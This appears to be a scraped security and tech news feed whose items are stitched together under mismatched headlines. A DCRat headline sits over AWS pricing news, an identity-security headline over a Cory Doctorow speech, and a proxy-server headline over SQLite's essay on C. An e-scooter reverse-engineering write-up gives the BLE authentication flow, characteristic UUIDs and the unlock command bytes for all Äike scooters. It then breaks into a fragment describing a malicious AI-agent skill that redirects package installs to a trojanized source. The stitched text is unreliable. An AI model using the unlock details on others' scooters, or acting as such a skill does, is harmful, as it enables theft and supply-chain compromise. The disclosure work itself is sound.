feed or get updates on Bluesky.]]></content:encoded></item><item><title>Reverse engineering my cloud-connected e-scooter and finding the master key to unlock all scooters</title><link>https://blog.nns.ee/2026/01/06/aike-ble/</link><author>/u/crower</author><category>netsec</category><pubDate>Tue, 6 Jan 2026 14:28:26 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[A few years ago, I decided to buy an electric scooter for commuting in the city. I had already been using rental scooters for a while, but got tired of having to "hunt" for one or realizing there isn't one near my apartment building when I wanted to go to work in the morning.I decided to go with an Äike T. This wasn't because it was necessarily better than the competitors' products. In fact, the scooter was fairly expensive, and at that price point, there were certainly scooters on the market that were technically superior.However, I went with the Äike because it was a local product and I like to support local companies whenever possible. Äike (meaning "lightning" in Estonian) was designed and manufactured in Estonia, right here in Tallinn. From what I could tell, they also didn't use many off-the-shelf components. The design was fully custom, the IoT module used in the scooter was also locally produced, they had their own battery pack, and so on. This isn't necessarily a good thing because it hurts the maintainability of the scooter, but I found their product ambitious.Another reason was that they had a sister company Tuul (meaning "wind" in Estonian) which offered rental scooters. These scooters were also just Äike scooters, and out of all of the competitors, I enjoyed the ride that Tuul/Äike offered the most and used their rental service whenever possible.Äike went bankrupt last year. While this is unfortunate as in the long term, it'll become increasingly harder to source replacement components due to all of them being custom, I started having much more immediate concerns regarding the usability of my scooter. The scooter does not have a manual start-stop function. Starting and stopping, unlocking the battery tray, setting it into transport mode, etc is all done via their app.The app is, of course, connected to the "cloud". Some of the features had already stopped working or been shut down (live tracking on the map, tracking ride length history, etc). Other features relying on the "cloud" seemed to still be working. I was uncertain whether at one point, I would not be able to use the app at all, thus locking me out of my own scooter entirely. This motivated me to start reverse engineering the scooter and its app to see if I couldn't make a third party app to communicate with the scooter.My first step was to start reverse engineering the Android app. Soon after I started, I realized there was a critical security issue in the scooter which allowed me to not only unlock and control my  scooter, but any Äike scooter at all.The app is written in React Native. There's two ways how you can compile React Native apps.The older method bundled a JavaScript file in the app, and was interpreted by React Native's JavaScript engine when the app was executed. Although minified, the JavaScript file is fairly readable and reverse engineering the functionality is not complex - the more challenging part is reverse engineering any native modules or Java/Kotlin glue. Modifying the JavaScript to run custom code for instrumentation is trivial.The newer method compiles the JavaScript code into React Native's own bytecode, which will be executed by RN's VM called Hermes. In this scenario, the complexity is turned upside down. Hermes bytecode is not -understood and the tooling for reverse engineering apps built using this newer method is lackluster. This is especially true considering how powerful modern decompilers for Java/Kotlin are, meaning that the  classes is the more easily understood compiled code here.The Äike app was compiled using the newer method. This was unfortunate as it was far more challenging to reverse engineer the app as I had hoped, but also fortunate because I enjoy a good challenge.Hermes bytecode doesn't have good decompilers that spit out code. There have been afewprojects that have tried to tackle this, but the output they produce is quite noisy and not very readable. In the end, I mostly used Pilfer's hermes_rs project, as it was the most state-of-the-art project and I felt comfortable working with the Rust code.While React Native was used for a lot of the functionality, it had to call native Android functions at one point. I knew this to be especially true as the app uses Bluetooth to communicate with the scooter (besides "the cloud"), and in order to do  with Bluetooth in Android, you of course have to use native OS functionality. For this, the app used some Kotlin glue code. My Java decompiler of choice is Vineflower and this managed to decompile the code I was interested in into a fairly readable output.I realized that the Kotlin code was used merely as a "bridge" to speak to the OS, and the actual logic was in the Hermes bytecode. This made me rely fairly heavily on Frida to sniff the Bluetooth communication at runtime. From inspecting the decompiled code, I knew that most of the Bluetooth communication was performed over BLE GATT characteristics. I won't go into detail on how GATT characteristics work here (if you're interested, have a look at ERNW's recent security research into Bluetooth headphones). What's important to know is that we can sniff and modify this traffic using Frida fairly easily.Android exposes the Java classes android.bluetooth.BluetoothGatt and android.bluetooth.BluetoothGattCallback that apps are expected to use to use GATT characteristics. We can use Frida to hook into these and override many of the interesting functions.I was mostly interested in reads, writes and GATT notifications, so I whipped up a Frida script to hook into these and print all comms to the console:After getting my testing environment more or less set up, I started going through the different functionalities of the app to figure out how communication works. By sniffing how the app connects to the scooter, I observed the following flow:The app connects to the scooter.The app reads the characteristic 00002556-1212-efde-1523-785feabcd123. This contains a random 20-byte value.The app writes a different 20-byte value to the characteristic 00002557-1212-efde-1523-785feabcd123.The app proceeds with writing commands to the characteristic 0000155f-1212-efde-1523-785feabcd123. This is where it would send the lock and unlock commands, the battery tray opening command, etc.The app disconnects (when closed). Further connections start from step 1 again.Steps 2 and 3 seemed to be a challenge-response authentication of some sort. Without doing those steps first, I couldn't simply skip to step 4 and start sending commands to the scooter as they would be rejected.The 20-byte value had me suspecting that SHA-1 was somehow being used. To confirm, I wrote another Frida script that hooks Android hashing functions exposed by the Java class java.security.MessageDigest:With both Frida scripts running, my suspicion was confirmed:[BLE READ] UUID: 00002556-1212-efde-1523-785feabcd123

The challenge value read from the  characteristic was concatenated with 20 bytes of , and the resulting hash was written to the  characteristic. But where did this  value come from?The app uses Firebase for most of its cloud functionality. When signing in and pairing your scooter, the server sends the app a secret key. This is stored on the Android device, and can be read with root access:As is shown in the output, the  value is .I suspected that this was meant to be unique between each scooter. This was also indicated by the software SDK for the IoT modules used in these scooters - in fact, the  key was the default value in the SDK, which developers were expected to change. This was confirmed by a representative of the company who produces these modules when I reported this issue to them. Apparently, the Äike development team had neglected to set a different key for each scooter, and the blank  key was used for each scooter.From what I've observed, Tuul rental scooters do not seem to have Bluetooth enabled and thus are not vulnerable to this issue.Knowing all of this, it's actually fairly simple to authenticate to any Äike scooter in the vicinity and start sending commands to it. I wrote a proof-of-concept Python script that does exactly that - first, it authenticates to any discovered scooters using the default  key, and then it sends a command to unlock the scooter. It requires Python 3 and the  Bluetooth library to run.Of course, I didn't want to merely connect and authenticate to the scooter, I also wanted to be able to send commands to it and communicate with it.By doing some more reverse engineering and dynamic analysis, I discovered that the command messages (written to characteristic 0000155f-1212-efde-1523-785feabcd123) generally adhere to the following 10-byte structure:Header byte 1 (always )Registry ID - typically  for commandsFor example, the unlock command () with no parameter would be:00 D4 00 01 00 00 00 00 00 00

To make this possible, these assistants rely on plugin marketplaces, where third-party developers can enable ‘skills’ that teach the agent how to manage infrastructure, testing, and dependencies. Though powerful, the model requires a high degree of trust, thus bringing with it a new set of risks.At a first glance, third-party marketplace plugins are harmless productivity boosters. Connect a marketplace and enable a plugin so your coding assistant becomes smarter about your stack. However, beneath the convenience is a security blind spot: These same skills often run with extremely high privilege and very little transparency on  they make decisions or  the code and dependencies are coming from. The code issue isn’t prompt manipulation or social engineering – it’s compromised automation.A full technical blog post by SentinelOne’s own Prompt Security team . When the developer asks the agent to install a common Python library, that skill quietly redirects the install to an attacker-controlled source, ensuring a trojanized version of the library is pulled into the project. While nothing looks wrong – the library imports cleanly, the example code runs without error – malicious code is now embedded into the environment, capable of exfiltrating secrets, monitoring traffic, or lying dormant until it is triggered at a later time.What makes this especially concerning is persistence. Marketplace plugins are not one-off interactions. Once enabled, their skills remain available across sessions and will continue to shape how the agent behaves in the future. Rather than a ‘bad prompt’, this effect is more like compromising your package manager itself.As AI-driven development workflows accelerate, plugin marketplaces and third-party skills are now part of the software supply chain whether teams realize it or not. .Read the full blog post here for a detailed walkthrough of the attack mechanics and learn why dependency skills are such a powerful, but under-modeled, risk.]]></content:encoded></item><item><title>What Is a Proxy Server?

Note: Sections 2.0 and 3.0 of this article were added in response
to comments on 
Hacker News and
Reddit.

Since its inception on 2000-05-29, SQLite has been implemented in generic C.
C was and continues to be the best language for implementing a software
library like SQLite.  There are no plans to recode SQLite in any other
programming language at this time.


The reasons why C is the best language to implement SQLite include:


C is a great language for writing fast code.  C is sometimes
described as "portable assembly language".  It enables developers
to code as close to the underlying hardware as possible while still
remaining portable across platforms.

Other programming languages sometimes claim to be "as fast as C".
But no other language claims to be faster than C for general-purpose
programming, because none are.

Nearly all systems have the ability to call libraries
written in C.  This is not true of other implementation languages.

So, for example, Android applications written in Java are able to
invoke SQLite (through an adaptor).  Maybe it would have been more
convenient for Android if SQLite had been coded in Java as that would
make the interface simpler.  However, on iPhone applications are coded
in Objective-C or Swift, neither of which have the ability to call
libraries written in Java.  Thus, SQLite would be unusable on iPhones
had it been written in Java.

Libraries written in C do not have a huge run-time dependency.
In its minimum configuration, SQLite requires only the following
routines from the standard C library:


In a more complete build, SQLite also uses library routines like
malloc() and free() and operating system interfaces for opening, reading,
writing, and closing files.  But even then, the number of dependencies
is very small.  Other "modern" languages, in contrast, often require
multi-megabyte runtimes loaded with thousands and thousands of interfaces.


The C language is old and boring.
It is a well-known and well-understood language.
This is exactly what one wants when developing a module like SQLite.
Writing a small, fast, and reliable database engine is hard enough as it
is without the implementation language changing out from under you with
each update to the implementation language specification.


Some programmers cannot imagine developing a complex system like
SQLite in a language that is not "object oriented".  So why is
SQLite not coded in C++ or Java?


Libraries written in C++ or Java can generally only be used by
applications written in the same language. It is difficult to
get an application written in Haskell or Java to invoke a library
written in C++.  On the other hand, libraries written in C are
callable from any programming language.


Object-Oriented is a design pattern, not a programming language.
You can do object-oriented programming in any language you want,
including assembly language.  Some languages (ex: C++ or Java) make
object-oriented easier.  But you can still do object-oriented programming
in languages like C.


Object-oriented is not the only valid design pattern.
Many programmers have been taught to think purely in terms of
objects.  And, to be fair, objects are often a good way to
decompose a problem.  But objects are not the only way, and are
not always the best way to decompose a problem.  Sometimes good old
procedural code is easier to write, easier to maintain and understand,
and faster than object-oriented code.


When SQLite was first being developed, Java was a young and immature
language.  C++ was older, but was undergoing such growing pains that
it was difficult to find any two C++ compilers that worked the same
way.  So C was definitely a better choice back when SQLite was first
being developed.  The situation is less stark now, but there is little
to no benefit in recoding SQLite at this point.

There has lately been a lot of interest in "safe" programming languages
like Rust or Go in which it is impossible, or is at least difficult, to make
common programming errors like memory leaks or array overruns.  So the
question often arises as to why SQLite is not coded in a "safe" language.


None of the safe programming languages existed for the first 10 years
of SQLite's existence.  SQLite could be recoded in Go or Rust, but doing
so would probably introduce far more bugs than would be fixed, and it
may also result in slower code.


Safe languages insert additional machine branches to do things like
verify that array accesses are in-bounds.  In correct code, those
branches are never taken.  That means that the machine code cannot
be 100% branch tested, which is an important component of SQLite's
quality strategy.


Safe languages usually want to abort if they encounter an out-of-memory
(OOM) situation.  SQLite is designed to recover gracefully from an OOM.
It is unclear how this could be accomplished in the current crop of
safe languages.


All of the existing safe languages are new.  The developers of SQLite
applaud the efforts of computer language researchers in trying to
develop languages that are easier to program safely.  We encourage these
efforts to continue.  But we ourselves are more interested in old and
boring languages when it comes to implementing SQLite.

All that said, it is possible that SQLite might
one day be recoded in Rust.  Recoding SQLite in Go is unlikely
since Go hates assert().  But Rust is a possibility.  Some
preconditions that must occur before SQLite is recoded in Rust
include:

 Rust needs to mature a little more, stop changing so fast, and
     move further toward being old and boring.
 Rust needs to demonstrate that it can be used to create general-purpose
     libraries that are callable from all other programming languages.
 Rust needs to demonstrate that it can produce object code that
     works on obscure embedded devices, including devices that lack
     an operating system.
 Rust needs to pick up the necessary tooling that enables one to
     do 100% branch coverage testing of the compiled binaries.
 Rust needs a mechanism to recover gracefully from OOM errors.
 Rust needs to demonstrate that it can do the kinds of work that
     C does in SQLite without a significant speed penalty.

If you are a "rustacean" and feel that Rust already meets the
preconditions listed above, and that SQLite should be recoded in
Rust, then you are welcomed and encouraged
to contact the SQLite developers privately
and argue your case.

The thousands of YouTube videos it targets at kids makes it subject to a US law called the Children’s Online Privacy Protection Act (COPPA). Enacted in 1998, COPPA is designed to protect children under the age of 13 from having their data collected and used online.That protection matters because children are far less able to understand data collection, advertising, or profiling, and cannot understandingfully consent to it. When COPPA safeguards fail, children may be tracked across videos, served targeted ads, or profiled based on viewing habits, all without parental knowledge or approval.In 2019, YouTube introduced a policy to help creators comply with COPPA by labeling their content as  or . Content labeled MFK is automatically restricted. For example, it can’t autoplay into related content, appear in the miniplayer, or be added to playlists.This policy came about after the YouTube’s own painful COPPA-related experience in 2019, when it settled for $170m with the FTC after failing to properly label content directed at children. That still ranks as the biggest ever COPPA settlement by far.Perhaps the two most important restrictions for videos labeled MFK are these: MFK videos should only autoplay into other kid-appropriate content, preventing (at least in theory) kids from seeing inappropriate content. And advertisers are prohibited from collecting personal data from children watching those videos.A chastened YouTube warned content creators, including Disney, that they could violate COPPA if they failed to label content correctly. They could do this in two ways: Creators could label entire channels (Disney has about 1,250 of these for its different content brands) or individual videos. So, a channel marked NMFK could still host MFK videos, but those individual videos needed to be labeled correctly.According to the FTC, Disney’s efforts fell short and plenty of child-targeted videos were incorrectly labeled. The court complaint stated that Disney applied blanket NMFK labels to entire YouTube channels instead of reviewing videos individually. As a result, some child-targeted videos were incorrectly labeled, allowing data collection and ad targeting that COPPA is meant to prevent. For example, the Pixar channel was labeled NMFK, but showed “very similar” videos from the Pixar  channel, which was labeled MFK.The FTC said YouTube warned Disney in June 2020 that it had reclassified more than 300 of its videos as child-directed across channels including Pixar, Disney Movies, and Walt Disney Animation Studios.This is not Disney’s first privacy rodeoDisney has a history of tussles with child privacy laws. In 2011, its Playdom subsidiary paid $3 million (at that point the largest COPPA penalty ever) for collecting data from more than 1.2 million children across 20 virtual world websites. In 2021, Disney also settled a lawsuit that accused it and others of collecting and selling kids’ information via child-focused mobile apps.In the current case, the FTC voted 3-0 to refer this current case to the Department of Justice, with Commissioners Ferguson, Holyoak, and Meador citing what they described as, “Disney’s abuse of parents’ trust.”Under the settlement, Disney must do more than pay up. It also has to notify parents before collecting personal information from children under 13 and obtain parents’ consent to use it. Disney must also review whether individual videos should be labeled as made for kids. However, the FTC provides a get-out clause: Disney won’t have to do this if YouTube implements age assurance technologies that determine a viewer’s age (or age category).Age assurance is clearly something the FTC is pursuing, saying:“This forward-looking provision reflects and anticipates the growing use of age assurance technologies to protect kids online.”We don’t just report on privacy—we offer you the option to use it.]]></content:encoded></item><item><title>Fake Booking Emails Redirect Hotel Staff to Fake BSoD Pages Delivering DCRat</title><link>https://thehackernews.com/2026/01/fake-booking-emails-redirect-hotel.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlFgZ371OJLB7x0fK_3a34h710DpAHQLeyLQyaBpp1jhfsFyRD0-tmkLhXAvv0VD1XnU_WK8g5O16VUob1aHIyQf2smhkn6llIaC_H5_6MwogFRD11Hfp-w2kPc9vgiBUTlnftXM7VuCMsFmBPwxtyvAokqOJbgSAndESDU3qZV6-R9SH6meqbyuyoFk8n/s1600/windows.jpg" length="" type=""/><pubDate>Tue, 6 Jan 2026 12:13:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Source: Securonix

"What happens if AWS hikes prices" has always been something of a boogeyman, trotted out as a hypothetical to urge folks to avoid taking dependencies on a given provider.Over the weekend - on a Saturday, no less - that hypothetical became real.AWS has quietly raised prices on its EC2 Capacity Blocks for ML by approximately 15 percent. The p5e.48xlarge instance – eight NVIDIA H200 accelerators in a trenchcoat – jumped from $34.61 to $39.80 per hour across most regions, while the p5en.48xlarge climbed from $36.18 to $41.61. Customers in US West (N. California) face steeper hikes, with p5e rates rising from $43.26 to $49.75. The change had been telegraphed: AWS's pricing page noted (and bizarrely, still does) that "current prices are scheduled to be updated in January, 2026," though the company neglected to mention which direction.This comes about seven months after AWS trumpeted "up to 45% price reductions" for GPU instances - though that announcement covered On-Demand and Savings Plans rather than Capacity Blocks. Funny how that works.For the uninitiated, Capacity Blocks are AWS's answer to "I need guaranteed GPU capacity for my ML training job next Tuesday." You reserve specific GPU instances for a defined time window – anywhere from a day to a few weeks out – and pay up front at a locked-in rate. It's popular with companies doing serious ML work who can't afford to have a training run interrupted because spot capacity evaporated. The pricing should make it abundantly clear that the people using this aren't hobbyists; these are teams with budgets measured in millions.An Amazon spox told us via email, "EC2 Capacity Blocks for ML pricing vary based on supply and demand patterns, as described on the product detail page. This price adjustment reflects the supply/demand patterns we expect this quarter."To be clear, AWS has raised prices before, but rarely as a straight increase to a line item. The company prefers to change pricing dimensions entirely, often spinning this as a price reduction for most customers – a claim I'd characterize as "creative." Historical straight-up price increases have been tied to regulatory actions: per-SMS charges in certain markets and the like. This is different.The timing is curious for another reason: it hands Azure and GCP a talking point on a silver platter. Both have been aggressively courting ML workloads, and "AWS just raised GPU prices 15%" is exactly the kind of ammunition enterprise sales teams dream about. Whether the competitors can actually absorb the demand is another question – GPU constraints are hardly unique to AWS – but perception matters in enterprise deals.For companies with Enterprise Discount Programs or other negotiated agreements, this raises uncomfortable questions. EDPs typically guarantee discounts off public pricing – so if public pricing goes up 15 percent, your "discounted" rate just got more expensive in absolute terms, even if the percentage held steady. I expect some pointed conversations between AWS account teams and their larger customers in the coming weeks.It's hard not to see this as a bellwether. GPUs are increasingly constrained globally as the world pivots to generating slop-as-a-service in every conceivable domain. The question is what this means for other resource types down the road. Does the global RAM crunch mean RAM-centric services are next? You can ignore ML Capacity Block pricing if you're not running machine learning workloads – which describes north of 95 percent of most companies' cloud spend – but RAM touches every service AWS offers. Well, possibly excepting their support function, though that's rapidly becoming "AI-Powered" too, so give it time.The canary-in-the-coal-mine concern here isn't GPUs specifically, but rather the precedent it establishes. AWS has spent two decades conditioning customers to expect prices only ever go down. That expectation is now broken. Once you've raised prices on one service and the world doesn't end, the second increase becomes easier. And the third. The playbook has changed.Keep an eye on services where AWS faces genuine supply constraints or where their costs have materially increased. Graviton instances have been priced aggressively to drive adoption – what happens when ARM chip supply tightens? Data transfer costs have been a cash cow for years, but they've also been stable; are those next? I don't have inside information, but I do have pattern recognition, and the pattern just shifted.AWS has long benefited from the assumption that cloud pricing only trends in one direction. That assumption died on a Saturday in January, with all the fanfare of a Terms of Service update. The question isn't whether this matters – it does. The question is whether it's an anomaly or the new normal. My money's on the latter. ®]]></content:encoded></item><item><title>What is Identity Dark Matter?</title><link>https://thehackernews.com/2026/01/what-is-identity-dark-matter.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEimEQJzjgjvmRoxiOvQDswNk4aPb0STZSmlm6rBFlVh7oIWzu0XT-hTarbOhpjAkrNk5HK6JM4WG0zm0JoofGChmxAyJRgYpPghychWIhMDkl1s_LlWzaeYjEcjAPaJI0vZFsBVYEaxtzeYvJljHwLH_6r9Hp5pysms3sNK5NSVtK6CENQWAS0fVxFpXDo/s1600/main.gif" length="" type=""/><pubDate>Tue, 6 Jan 2026 11:30:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[The Invisible Half of the Identity Universe

I'm about to start my 25th year there. I know that I'm hardly unbiased, but as far as I'm concerned, there's no group anywhere on Earth that does the work of defending our digital rights better than EFF.I'm an activist there, and for the past quarter-century, I've been embroiled in something I call "The War on General Purpose Computing."If you were at 28C3, 14 years ago, you may have heard me give a talk with that title. Those are the trenches I've been in since my very first day on the job at EFF, when I flew to Los Angeles to crash the inaugural meeting of something called the "Broadcast Protection Discussion Group," an unholy alliance of tech companies, media companies, broadcasters and cable operators.They'd gathered because this lavishly corrupt American congressman, Billy Tauzin, had promised them a new regulation – a rule banning the manufacture and sale of digital computers, unless they had been backdoored to specifications set by that group, specifications for technical measures to block computers from performing operations that were dispreferred by these companies' shareholders.That rule was called "the Broadcast Flag," and it actually passed through the American telecoms regulator, the Federal Communications Commission. So we sued the FCC in federal court, and overturned the rule.We won that skirmish, but friends, I have bad news, news that will not surprise you. Despite wins like that one, we have been losing the war on the general purpose computer for the past 25 years.Which is why I've come to Hamburg today. Because, after decades of throwing myself against a locked door, the door that leads to a new, good internet, one that delivers both the technological self-determination of the old, good internet, and the ease of use of Web 2.0 that let our normie friends join the party, that door has been unlocked.Today, it is open a crack. It's open a crack!And here's the weirdest part: Donald Trump is the guy who's unlocked that door.Oh, he didn't do it on purpose! But, thanks to Trump's incontinent belligerence, we are on the cusp of a "Post-American Internet," a new digital nervous system for the 21st century. An internet that we can build without worrying about America's demands and priorities.Now, don't get me wrong, I'm not  about Trump or his policies. But as my friend Joey DaVilla likes to say "When life gives you SARS, you make sarsaparilla." The only thing worse than experiencing all the terror that Trump has unleashed on America and the world would be going through all that and not salvaging anything out of the wreckage.That's what I want to talk to you about today: the post-American Internet we can wrest from Trump's chaos.A post-American Internet that is possible because Trump has mobilized new coalition partners to join the fight on our side. In politics, coalitions are . Any time you see a group of people suddenly succeeding at a goal they have been failing to achieve, it's a sure bet that they've found some coalition partners, new allies who don't want  the same thing as the original forces, but want  of the same things to fight on their side.That's where Trump came from: a coalition of billionaires, white nationalists, Christian bigots, authoritarians, conspiratorialists, imperialists, and self-described "libertarians" who've got such a scorching case of low-tax brain worms that they'd vote for Mussolini if he'd promise to lower their taxes by a nickel.And what's got me so excited is that  got a new coalition in the War on General Purpose Computers: a coalition that includes the digital rights activists who've been on the lines for decades, but  people who want to turn America's Big Tech trillions into billions for their own economy,  national security hawks who are quite rightly worried about digital sovereignty.My thesis here is that this is an  coalition. Which is good news! For the first time in decades, victory is in our grasp.So let me explain: 14 years ago, I stood in front of this group and explained the "War on General Purpose Computing." That was my snappy name for this fight, but the boring name that they use in legislatures for it is "anticircumvention,"Under anticircumvention law, it's a crime to alter the functioning of a digital product or service, unless the manufacturer approves of your modification, and – crucially – this is true  your modification violates .Anticircumvention law originates in the USA: Section 1201 of the Digital Millennium Copyright Act of 1998 establishes a felony punishable by a five year prison sentence and a $500,000 fine for a first offense for bypassing an "access control" for a copyrighted work.So practically speaking, if you design a device or service with even the flimsiest of systems to prevent modification of its application code or firmware, it's a felony – a jailable felony – to modify that code or firmware. It's also a felony to disclose information about  to bypass that access control, which means that pen-testers who even  how they access a device or system face criminal liability.Under anticircumvention law any manufacturer can trivially turn their product into a no-go zone, criminalizing the act of investigating its defects, criminalizing the act of reporting on its defects, and criminalizing the act of remediating its defects.This is a law that Jay Freeman rightly calls "Felony Contempt of Business Model." Anticircumvention became the law of the land in 1998 when Bill Clinton signed the DMCA. But before you start snickering at those stupid Americans, know this: every  country in the world has passed a law  in the years since. Here in the EU, it came in through Article 6 of the 2001 EU Copyright Directive.Now, it makes a certain twisted sense for the US to enact a law like this, after all, they are the world's tech powerhouse, home to the biggest, most powerful tech companies in the world. By making it illegal to modify digital products without the manufacturer's permission, America enhances the rent-extracting power of the most valuable companies on US stock exchanges.But why would  pass a law like this? Europe is a massive tech . By extending legal protection to tech companies that want to steal their users' data and money, the EU was facilitating a one-way transfer of value from Europe to America. So why would Europe do this?Well, let me tell you about the circumstances under which  countries came to enact their anticircumvention laws and maybe you'll spot a pattern that will answer this question.Australia got its anticircumvention law through the US-Australia Free Trade Agreement, which obliges Australia to enact anticircumvention law.Canada and Mexico got it through the US-Mexico-Canada Free Trade Agreement, which obliges Canada and Mexico to enact anticircumvention laws.Andean nations like Chile got their anticircumvention laws through bilateral US free trade agreements, which oblige them to enact anticircumvention laws.And the Central American nations got their anticircumvention laws through CAFTA – The Central American Free Trade Agreement with the USA – which obliges them to enact anticircumvention laws, too.I assume you've spotted the pattern by now: the US trade representative has forced every one of its trading partners to adopt anticircumvention law, to facilitate the extraction of their own people's data and money by American firms. But of course, that only raises a further question: Why would every other country in the world agree to let America steal its own people's money and data, and block its domestic tech sector from making interoperable products that would prevent this theft?Here's an anecdote that unravels this riddle: many years ago, in the years before Viktor Orban rose to power, I used to guest-lecture at a summer PhD program in political science at Budapest's Central European University. And one summer, after I'd lectured to my students about anticircumvention law, one of them approached me.They had been the information minister of a Central American nation during the CAFTA negotiations, and one day, they'd received a phone-call from their trade negotiator, calling from the CAFTA bargaining table. The negotiator said, "You know how you told me not to give the Americans anticircumvention under any circumstances? Well, they're saying that they won't take our coffee unless we give them anticircumvention. And I'm sorry, but we just can't lose the US coffee market. Our economy would collapse. So we're going to give them anticircumvention. I'm really sorry."That's it. That's why every government in the world allowed US Big Tech companies to declare open season on their people's private data and ready cash.The alternative was tariffs. Well, I don't know if you've heard, but we've got tariffs now!I mean, if someone threatens to burn your house down unless you follow their orders, and then they burn your house down anyway, you don't have to keep following their orders. So…Happy Liberation Day?So far, every country in the world has had one of two responses to the Trump tariffs. The first one is: "Give Trump everything he asks for (except Greenland) and hope he stops being mad at you." This has been an absolute failure. Give Trump an inch, he'll take a mile. He'll take fucking . Capitulation is a failure.But so is the other tactic: retaliatory tariffs. That's what we've done in Canada (like all the best Americans, I'm Canadian). Our top move has been to levy tariffs on the stuff we import from America, making the things we buy  expensive. That's a weird way to punish America! It's like punching yourself in the face as hard as you can, and hoping the downstairs neighbor says "Ouch!"And it's . Why whack some poor farmer from a state that begins and ends with a vowel with tariffs on his soybeans. That guy never did anything bad to Canada.But there's a third possible response to tariffs, one that's just sitting there, begging to be tried: what about repealing anticircumvention law?If you're a technologist or an investor based in a country that's repealed its anticircumvention law, you can go into business making disenshittificatory products that plug into America's defective tech exports, allowing the people who own and use those products to use them in ways that are good for them, even if those uses make the company's shareholders mad.Think of John Deere tractors: when a farmer's John Deere tractor breaks down, they are expected to repair it, swapping in new parts and assemblies to replace whatever's malfing. But the tractor won't recognize that new part and will not start working again, not until the farmer spends a couple hundred bucks on a service callout from an official John Deere tractor repair rep, whose only job is to type an unlock code into the tractor's console, to initialize the part and pair it with the tractor's main computing unit.Modding a tractor to bypass this activation step violates anticircumvention law, meaning farmers all over the world are stuck with this ripoff garbage, because their  government will lock up anyone who makes a tractor mod that disables the parts-pairing check in this American product.So what if Canada repealed Bill C-11, the Copyright Modernization Act of 2012 (that's our anticircumvention law)? Well, then a company like Honeybee, which makes tractor front-ends and attachments, could hire some smart University of Waterloo computer science grads, and put 'em to work jailbreaking the John Deere tractor's firmware, and offer it to everyone in the world. They could sell the crack to anyone with an internet connection and a payment method, including that poor American farmer whose soybeans we're currently tariffing.It's hard to convey how much money is on the table here. Take just  example: Apple's App Store. Apple forces all app vendors into using its payment processor, and charges them a  commission on every euro spent inside of an app.30 percent! That's  a profitable business that Apple makes  on it. If the EU repeals Article 6 of the Copyright Directive, some smart geeks in Finland could reverse-engineer Apple's bootloaders and make a hardware dongle that jailbreaks phones so that they can use alternative app stores, and sell the dongle – along with the infrastructure to operate an app store – to anyone in the world who wants to go into business competing with Apple for users and app vendors.Those competitors could offer a 90% discount to every crafter on Etsy, every performer on Patreon, every online news outlet, every game dev, every media store. Offer them a 90% discount on payments, and  make $10b/year.Maybe Finland will never see another Nokia, but Nokia's a tough business to be in. You've got to make hardware, which is expensive and risky. But if the EU legalizes jailbreaking, then  would have to incur all the expense and risk of making and fielding hardware, while those Finnish geeks could cream off the $100b Apple sucks out of the global economy in an act of a disgusting, rip-off rent-seeking.As Jeff Bezos said to the publishers: "Your margin is my opportunity." With these guys, it's always "disruption for thee, but not for me." When they do it to us, that's progress. When we do it to them, it's piracy, and every pirate wants to be an admiral.Well, screw that. Move fast and break Tim Cook's things. Move fast and break !It's funny: I spent 25 years getting my ass kicked by the US Trade Representative (in my defense, it wasn't a fair fight). I developed a kind of grudging admiration for the skill with which the USTR bound the entire world to a system of trade that conferred parochial advantages to America and its tech firms, giving them free rein to loot the world's data and economies. So it's been pretty amazing to watch Trump swiftly and decisively dismantle the global system of trade and destroy the case for the world continuing to arrange its affairs to protect the interests of America's capital class.I mean, it's not a path I would have chosen. I'd have preferred no Trump at all to this breakthrough. But I'll take this massive own-goal if Trump insists. I mean, I'm not saying I've become an accelerationist, but at this point, I'm not exactly  an accelerationist.Now, you might have heard that governments around the world have been trying to get Apple to open its App Store, and they've totally failed at this. When the EU hit Apple with an enforcement order under the Digital Markets Act, Apple responded by offering to allow third party app stores, but it would only allow those stores to sell apps that Apple had approved of.And while those stores  use their own payment processors, Apple would charge them so much in junk fees that it would be  expensive to process a payment using your own system, and if Apple believed that a user's phone had been outside of the EU for 21 days, they'd remotely delete all that user's data and apps.When the EU explained that this would not satisfy the regulation, Apple threatened to pull out of the EU. Then, once everyone had finished laughing, Apple filed more than a dozen bullshit objections to the order hoping to tie this up in court for a decade, the way Google and Meta did for the GDPR.It's not clear that the EU can force Apple to write code that opens up the iOS platform for alternative app stores and payment methods, but there is one thing that the EU can absolutely do with 100% reliability, any time they want: the EU can decide not to let Apple use Europe's courts to shut down European companies that defend European merchants, performers, makers, news outlets, game devs and creative workers, from Apple's ripoff, by jailbreaking phones.All the EU has to do is repeal Article 6 of the Copyright Directive, and, in so doing, strip Apple of the privilege of mobilizing the European justice system to shore up Apple's hundred billion dollar annual tax on the world's digital economy. The EU company that figures out how to reliably jailbreak iPhones will have customers all over the world, including in the USA, where Apple doesn't just use its veto over which apps you can run on your phone to suck 30% out of every dollar you spend, but where Apple also uses its control over the platform to strip out apps that protect Apple's customers from Trump's fascist takeover.Back in October, Apple kicked the "ICE Block" app out of the App Store. That's an app that warns the user if there's a snatch squad of masked ICE thugs nearby looking to grab you off the street and send you to an offshore gulag. Apple internally classified ICE kidnappers as a "protected class," and then declared the ICE Block infringed on the rights of these poor, beset ICE goons.And speaking of ICE thugs, there are plenty of qualified technologists who have fled the US this year, one step ahead of an ICE platoon looking to put them and their children into a camp. Those skilled hackers are now living all over the world, joined by investors who'd like to back a business whose success will be determined by how awesome its products are, and not how many $TRUMP coins they buy.Apple's margin could be  opportunity.Legalizing jailbreaking, raiding the highest margin lines of business of the most profitable companies in America is a  better response to the Trump tariffs than retaliatory tariffs.For one thing, this is a  response: go after Big Tech's margins and you're mounting a frontal assault on the businesses whose CEOs each paid a million bucks to sit behind Trump on the inauguration dais.Raiding Big Tech's margins is not an attack on the American people, nor on the small American businesses that are ripped off by Big Tech. It's a raid on the companies that screw everyday Americans  everyone else in the world. It's a way to make everyone in the world richer at the expense of these ripoff companies.It beats the shit out of blowing hundreds of billions of dollars building AI data-centers in the hopes that someday, a sector that's lost nearly a trillion dollars shipping defective chatbots will figure out a use for GPUs that doesn't start hemorrhaging money the minute they plug them in.So here are our new allies in the war on general-purpose computation: businesses and technologists who want to 